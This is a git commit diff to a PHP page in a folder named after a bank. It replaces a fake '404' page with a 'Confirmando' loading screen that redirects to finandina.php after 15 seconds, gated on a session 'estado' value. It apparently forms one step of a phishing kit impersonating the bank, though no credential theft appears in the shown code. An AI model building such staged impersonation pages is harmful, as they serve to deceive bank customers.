695d95b72cbed88d37a37fe5d8ee26c5694a1a6f
char20269 <char20269@gmail.com>
2024-12-28 22:35:27 -0500

    Add files via upload

--- finandina/index.php
+++ finandina/index.php
@@ -1,10 +1,8 @@
 <?php
-
-
 session_start();
 
+
 if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
-    header('location:/404.php');
 
 
 }else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){
@@ -24,9 +22,31 @@ if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ERROR 404</title>
+    <title>Confirmando</title>
+    
+  <style>
+
+*{
+  margin: 0;
+  padding: 0;
+  font-family: Arial, Helvetica, sans-serif;
+}
+</style>
+
+
 </head>
-<body>
-    <img src="/img/error.avif" alt="" srcset="" width="100%">
+<body style="background-color:#dcdcdc2d;">
+<br><br><br><br><br><br><br>
+    <center><img src="/assets/plane-loader.gif" alt="" srcset=""></center>
+
+
+<script>
+    // Redirigir a otra página después de 5 segundos
+setTimeout(function() {
+  window.location.href = "finandina.php";
+}, 15000);
+
+</script>
+
 </body>
 </html>
